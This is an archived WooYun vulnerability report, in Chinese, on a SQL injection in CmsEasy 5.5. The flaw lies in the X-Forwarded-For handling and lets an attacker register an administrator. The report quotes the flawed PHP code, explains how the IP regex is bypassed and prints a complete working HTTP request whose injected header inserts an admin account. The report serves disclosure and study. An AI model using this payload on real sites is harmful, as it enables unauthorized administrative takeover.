{"id": 1641, "wybug_id": "wooyun-2014-063525", "wybug_title": "CmsEasy最新版SQL注入可注册管理员", "wybug_corp": "cmseasy", "wybug_author": "xfkxfk", "wybug_date": "2014-06-04 17:45", "wybug_open_date": "2014-09-02 17:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向公众公开  简要描述： CmsEasy最新版SQL注入可注册管理员 详细说明：  CmsEasy_5.5_UTF-8_20140420.rar官方最新版存在SQL注入，无视GPC，可获取管理员账户，可注册管理员不知道跟之前蓝哥的那个重复么，先发再看吧。。。文件/lib/default/user_act.php\nfunction respond_action() {        ini_set(\"display_errors\",\"On\");        $classname = front::$get['ologin_code'];        if(front::post('regsubmit')) {            if(!config::get('reg_on')) {                front::flash(lang('网站已经关闭注册！'));                return;            }            if(front::post('username') != strip_tags(front::post('username'))                    ||front::post('username') != htmlspecialchars(front::post('username'))            ) {                front::flash(lang('用户名不规范！'));                return;            }            if(strlen(front::post('username'))<4) {                front::flash(lang('用户名太短！'));                return;            }\t            if(front::post('username') &&front::post('password')) {                $username=front::post('username');                $password=md5(front::post('password'));                $data=array(                        'username'=>$username,                        'password'=>$password,                        'groupid'=>101,                        'userip'=>front::ip(), //======问题在这里======                        $classname=>session::get('openid'),                );                if($this->_user->getrow(array('username'=>$username))) {                    front::flash(lang('该用户名已被注册！'));                    return;                }                $insert=$this->_user->rec_insert($data);                $_userid = $this->_user->insert_id();                if($insert){                    front::flash(lang('注册成功！'));                }else {                    front::flash(lang('注册失败！'));                    return;                }                $user=$data;                cookie::set('login_username',$user['username']);                cookie::set('login_password',front::cookie_encode($user['password']));                session::set('username',$user['username']);                front::redirect(url::create('user'));                exit;            }        }                if (front::post('submit')) {            if (front::post('username') && front::post('password')) {                $username = front::post('username');                $password = md5(front::post('password'));                $data = array(                    'username' => $username,                    'password' => $password,                );                $user = new user();                $row = $user->getrow(array('username' => $data['username'], 'password' => $data['password']));                if (!is_array($row)) {                    $this->login_false();                    return;                }                $post[$classname] = session::get('openid');                $this->_user->rec_update($post, 'userid=' . $row['userid']);                cookie::set('login_username', $row['username']);                cookie::set('login_password', front::cookie_encode($row['password']));                session::set('username', $row['username']);                front::redirect(url::create('user'));                return;            } else {                $this->login_false();                return;            }        }                include_once ROOT.'/lib/plugins/ologin/'.$classname.'.php';        $ologinobj = new $classname();        $status = $ologinobj->respond();        //var_dump(session::get('openid'));exit;        $where[$classname] = session::get('openid');        if(!$where[$classname]) front::redirect(url::create('user'));        $user = new user();        $data = $user->getrow($where);        if(!$data){            $this->view->data = $status;        }else{            cookie::set('login_username',$data['username']);            cookie::set('login_password',front::cookie_encode($data['password']));            session::set('username',$data['username']);            front::redirect(url::create('user'));        }    }\n我们再进入ip()函数：文件/lib/tool/front_class.php\nstatic function ip() {        if ($_SERVER['HTTP_CLIENT_IP']) {            $onlineip = $_SERVER['HTTP_CLIENT_IP'];        }        elseif ($_SERVER['HTTP_X_FORWARDED_FOR']) {            $onlineip = $_SERVER['HTTP_X_FORWARDED_FOR'];        }        elseif ($_SERVER['REMOTE_ADDR']) {            $onlineip = $_SERVER['REMOTE_ADDR'];        }        else {            $onlineip = $_SERVER['REMOTE_ADDR'];        }\t\tif(config::get('ipcheck_enable')){\t\t\tif(!preg_match('/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/', $onlineip)&&!preg_match('@^\\s*((([0-9A-Fa-f]{1,4}:){7}(([0-9A-Fa-f]{1,4})|:))|(([0-9A-Fa-f]{1,4}:){6}(:|((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})|(:[0-9A-Fa-f]{1,4})))|(([0-9A-Fa-f]{1,4}:){5}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){4}(:[0-9A-Fa-f]{1,4}){0,1}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){3}(:[0-9A-Fa-f]{1,4}){0,2}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){2}(:[0-9A-Fa-f]{1,4}){0,3}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:)(:[0-9A-Fa-f]{1,4}){0,4}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(:(:[0-9A-Fa-f]{1,4}){0,5}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})))(%.+)?\\s*$@', $onlineip)){\t\t\t\texit('来源非法');\t\t\t}\t\t}        return $onlineip;    }\n乍一看没什么问题，对ip进行了过滤但是我们看看后面的那个正则的最后面：(%.+)?\\s*这里有一个%，然后后面可以跟任何内容，127.0.0.1%xxxxxx这样也是符号正则的，这不就绕过了。。。。难道这是后门？！最后进入了：$insert=$this->_user->rec_insert($data);导致了注入产生。。。   漏洞证明：  之前的用户信息：\n\n发送请求：\nPOST /cmseasy1/index.php?case=user&act=respond HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 66X-Forwarded-For: 127.0.0.1%'),('xfkxfk','e10adc3949ba59abbe56e057f20f883e','2','127.0.0.1')#username=666666&password=666666&regsubmit=%2B%E6%B3%A8%E5%86%8C%2B\n\n\n成功添加管理员xfkxfk\n\n   修复方案：  我不知道这个%是干啥的，没想通。。。把后面的改一下就好了吧？！   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-05 11:10 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-07 13:55 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  http://loudong.360.cn/vul/info/id/7276 一个问题？    \n     2014-06-08 20:31 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @wefgod 不是，你所说漏洞在wooyyun重复，已被提交    \n     2014-06-09 10:51 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xfkxfk 原来如此    \n     2014-07-25 17:23 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  细心,这都被你发现了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}